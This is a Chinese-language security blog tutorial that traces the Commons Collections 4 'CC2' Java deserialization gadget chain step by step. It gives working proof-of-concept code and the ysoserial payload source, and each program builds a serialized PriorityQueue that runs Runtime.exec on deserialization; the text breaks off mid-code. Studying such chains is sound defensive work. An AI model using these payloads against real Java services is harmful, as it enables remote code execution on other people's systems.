<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220713185-1097329589.png" alt="image-20220428220712646"></p>
<p>在CC2链里不是利用 <code>AnnotationInvocationHandler</code>来构造，而是使用</p>
<p> <code>javassist</code>和<code>PriorityQueue</code>来构造利用链，所以先来了解下<code>PriorityQueue</code>的基本使用。</p>
<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p><strong>概念</strong></p>
<p><code>PriorityQueue</code> 一个基于优先级的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，或者根据构造队列时提供的 Comparator 进行排序，具体取决于所使用的构造方法。该队列不允许使用 null 元素也不允许插入不可比较的对象(没有实现Comparable接口的对象)。<br> <code>PriorityQueue</code> 队列的头指排序规则最小那个元素。如果多个元素都是最小值则随机选一个。<br> <code>PriorityQueue</code> 是一个无界队列，但是初始的容量(实际是一个Object[])，随着不断向优先级队列添加元素，其容量会自动扩容，无需指定容量增加策略的细节。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221232439-651517910.png" alt="image-20220428221231819"></p>
<p><strong>构造方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue()           </span><br><span class="line">	使用默认的初始容量（<span class="number">11</span>）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br><span class="line">PriorityQueue(<span class="type">int</span> initialCapacity)</span><br><span class="line">	使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br></pre></td></tr></table></figure>

<p><strong>常见方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(E e)           			将指定的元素插入此优先级队列</span><br><span class="line">clear()            			从此优先级队列中移除所有元素。</span><br><span class="line">comparator()       			返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 null</span><br><span class="line">contains(Object o)          如果此队列包含指定的元素，则返回 true。</span><br><span class="line">iterator()           		返回在此队列中的元素上进行迭代的迭代器。</span><br><span class="line">offer(E e)           		将指定的元素插入此优先级队列</span><br><span class="line">peek()           			获取但不移除此队列的头；如果此队列为空，则返回 null。</span><br><span class="line">poll()           			获取并移除此队列的头，如果此队列为空，则返回 null。</span><br><span class="line">remove(Object o)           	从此队列中移除指定元素的单个实例（如果存在）。</span><br><span class="line">size()           			返回此 collection 中的元素数。</span><br><span class="line">toArray()          			返回一个包含此队列所有元素的数组。</span><br></pre></td></tr></table></figure>

<p>代码实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PriorityQueueTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PriorityQueue&lt;String&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;String&gt;();</span><br><span class="line">        <span class="comment">//入列</span></span><br><span class="line">        q.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="comment">//出列</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//1</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//2</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//3</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//4</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221648706-1933465245.png" alt="image-20220428221648204"></p>
<p>观察打印结果， 入列：21534， 出列是12345， 也是说出列时做了相关判断，将最小的值返回。默认情况下<code>PriorityQueue</code>使用自然排序法，最小元素先出列。</p>
<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221854229-2119926089.png" alt="image-20220428221853556">这个类有个compare()方法，会调用<code>Transformer#transform()</code>方法，根据前面的学习，猜测这里可能存在利用点，那具体该怎么利用呢，是否真的可以利用呢，下面开始分析。</p>
<h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare()"></a>TransformingComparator.compare()</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 类中提供了 <code>compare()</code> 方法，在该方法中对 <code>this.transformer</code> 调用了 <code>transform()</code> 方法，如果this.<code>transformer</code>可控，那么就可以利用该方法执行 <code>ChainedTransformer.transform()</code> 方法，并进入之前构造好的 <code>java.lang.Runtime.getRuntime().exec()</code> 调用链。</p>
<p>那现在查看下this.<code>transformer</code>是如何被赋值的。</p>
<p>在<code>TransformingComparator</code>的构造方法中，看到了赋值情况，并且两个构造方法都是被public关键字修饰的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222500655-713162557.png" alt="image-20220428222500043"></p>
<p>也就是说，<code>this.transformer</code> 完全可控，我们可以将 <code>this.transformer</code> 指向 <code>ChainedTransformer</code> 对象来执行 <code>ChainedTransformer.transform()</code> 方法。</p>
<p>测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        transformingComparator.compare(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222751860-78428661.png" alt="image-20220428222750807"></p>
<p>成功弹出计算器，但是可以看到控制台报错了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222855641-1124003305.png" alt="image-20220428222855008"></p>
<p>根据报错信息，可以大致推断应该是类型转换有问题，而且运行的时候是先弹出计算器，后报错的，所以在下面的代码处打上断点</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223103501-833443309.png" alt="image-20220428223102363"></p>
<p>进入<code>compare()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223235512-1407610559.png" alt="image-20220428223235001"></p>
<p>这里的<code>transformer</code>被赋值为<code>ChainedTransformer</code>，然后调用<code>trasnform()</code>方法弹出计算器，所以我们重点就看函数的最后一行代码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223451589-1296639309.png" alt="image-20220428223451003"></p>
<p>进入，在方法的注释中可以看到异常的信息说明，大致就是如果传入的参数不实现<code>Comparable</code>可就会产生这个报错。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223653410-1966169796.png" alt="image-20220428223652822"></p>
<p>在这也看到，使用了泛型来约束传入的类型</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223811906-1530593051.png" alt="image-20220428223811362"></p>
<p>报错原因找到了之后，但上述的代码只是手动调用compare()方法弹出计算器，那现在如何使 <code>TransformingComparator.compare()</code> 方法自动调用呢？我们在 Java 内置的 <code>PriorityQueue</code> 类中找到了一条可行的路子。</p>
<h3 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a>PriorityQueue.readObject()</h3><p><code>PriorityQueue</code> 类的 <code>readObject()</code> 方法中调用了一个 <code>heapify()</code> 方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224041906-2006646584.png" alt="image-20220428224041303"></p>
<h3 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a>PriorityQueue.heapify()</h3><p>跟进 <code>heapify()</code> 方法，发现其调用了 <code>siftDown()</code> 方法，这里存在一个for循环，要想进入循环需要满足i &#x3D; (size &gt;&gt;&gt; 1) - 1 &gt;&#x3D; 0，即 <code>size &gt;= 2</code>，这里的size指的是队列中元素的个数。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224139339-1220977299.png" alt="image-20220428224138782"></p>
<h3 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a>PriorityQueue.siftDown()</h3><p>跟进 <code>siftDown()</code> 方法，发现如果 <code>comparator</code> 变量不为空，将调用 <code>siftDownUsingComparator()</code> 方法：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224410518-1285744807.png" alt="image-20220428224409958"></p>
<h3 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a>PriorityQueue.siftDownUsingComparator()</h3><p>跟进 <code>siftDownUsingComparator()</code> 方法，发现会调用 <code>comparator#compare()</code> 方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224546472-1478230969.png" alt="image-20220428224545847"></p>
<p>结合前面的<code>compare()</code>方法的利用，如果<code>comparator</code>可控的话，让它指向前文中构造的 <code>TransformingComparator</code> 对象，那么就可以执 <code>TransformingComparator.compare()</code> 方法了。那么，找一下<code>comparator</code>是怎么被赋值的。</p>
<p>查看 <code>PriorityQueue</code> 类的构造方法，其第 1 个参数用于指定队列的初始容量，第 2 个参数将赋值给 <code>this.comparator</code>，并且该构造方法对外开放，因此 <code>comparator</code> 变量完全可控</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428230103959-1884903828.png" alt="image-20220428230103189"></p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package cc2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class TransformingComparatorTest2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;getMethod&quot;,</span><br><span class="line">//                    new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;invoke&quot;,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        new Object[]&#123;null, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;exec&quot;,</span><br><span class="line">                        new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">//      transformingComparer.compare(&quot;test&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        byteArrayInputStream.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后，计算器弹出来了，但报错了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428232854470-716119011.png" alt="image-20220428232853231"></p>
<p>根据前面的报错分析，在调用<code>comparator.compare()</code>后，提示 “java.lang.ProcessImpl cannot be cast to java.lang.Comparable”，因为类型不符而报错，和上面那个报错是一样的，但是根据调试发现，程序在反序列化之前就弹出计算器了，那看看是怎么个调用的过程，</p>
<p>在如下地方打下断点</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233555440-365558024.png" alt="image-20220428233554728"></p>
<p>跟进add()方法，发现调用了offer()方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233638389-700739005.png" alt="image-20220428233637971"></p>
<p>跟进发现在<code>offer()</code>方法里会有一些if判断，这里如果i！&#x3D;0就会调用<code>siftUp()</code>方法，第一次调用add()方法时，这里的i&#x3D;0，即你不会调用siftUp()方法，当第二次调用add()方法时，就会进入，i&#x3D;1，就进入<code>siftUp()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233713262-1085845089.png" alt="image-20220428233712788"></p>
<p>跟进<code>siftUp()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234016305-1312990915.png" alt="image-20220428234015319"></p>
<p>这里判断comparator是否为空，如果为不空，就调用<code>siftUpUsingComparator()</code>方法，为空则调用<code>siftUpComparable()</code>方法，跟进<code>siftUpUsingComparator()</code>方法，这里会调用<code>comparator#compare()</code>方法，进而导致了计算器的弹出和报错的产生。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234124506-722393475.png" alt="image-20220428234123995"></p>
<p>我们返回，跟进<code>siftUpComparable()</code>方法，这里不会导致后续调用链的发生</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234310569-1479361245.png" alt="image-20220428234310116"></p>
<p>这里防止报错的关键是让<code>comparator</code>在<code>add()</code>方法调用的时候为空，实例化 <code>PriorityQueue</code> 对象后再通过反射将 <code>comparator</code> 设为 <code>TransformingComparator</code> 对象。</p>
<p>所以，优化代码后，可构造如下poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">// 传入 java.lang.Runtime 类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 反射调用 getMethod() 方法, 并通过 getMethod() 调用 getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 invoke() 方法, 并通过 invoke() 调用上一循环中返回的 Runtime.getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 exec() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进行反序列化的过程中会报同样的错误，但是在报错前就成功执行命令并弹出了计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428235511160-1422424351.png" alt="image-20220428235510084"></p>
<p>整个 Gadget Chain 的调用过程如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     ChainedTransformer.transform()</span><br><span class="line">         ConstantTransformer.transform()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">       Class.getMethod()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.getRuntime()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.exec()</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429000139365-2096780426.png" alt="image-20220429000138216"></p>
<h3 id="Ysoserial-利用链分析"><a href="#Ysoserial-利用链分析" class="headerlink" title="Ysoserial 利用链分析"></a>Ysoserial 利用链分析</h3><p>对于 Commons Collections 2 这条链，ysoserial 利用的是 <code>TemplatesImpl</code> 类来进行利用的，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">				...</span></span><br><span class="line"><span class="comment">					TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">						InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">							Method.invoke()</span></span><br><span class="line"><span class="comment">								Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123; &quot;org.apache.commons:commons-collections4:4.0&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Queue&lt;Object&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">		<span class="comment">// mock method name until armed</span></span><br><span class="line">		<span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">		<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">		<span class="comment">// stub data for replacement later</span></span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch method called by comparator</span></span><br><span class="line">		Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch contents of queue</span></span><br><span class="line">		<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">		queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">		queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> queue;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		PayloadRunner.run(CommonsCollections2.class, args);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面分析下<code>TemplatesImpl</code> 是怎么利用的</p>
<h3 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance()"></a>TemplatesImpl.getTransletInstance()</h3><p>函数中可以看到有一处newInstance()方法的调用</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001032573-1255924666.png" alt="image-20220429001031837"></p>
<p>在对类进行 <code>newInstance()</code> 实例化操作时，会首先执行类中的无参数构造方法或 <code>static&#123;&#125;</code> 静态块中的内容，下面为测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title 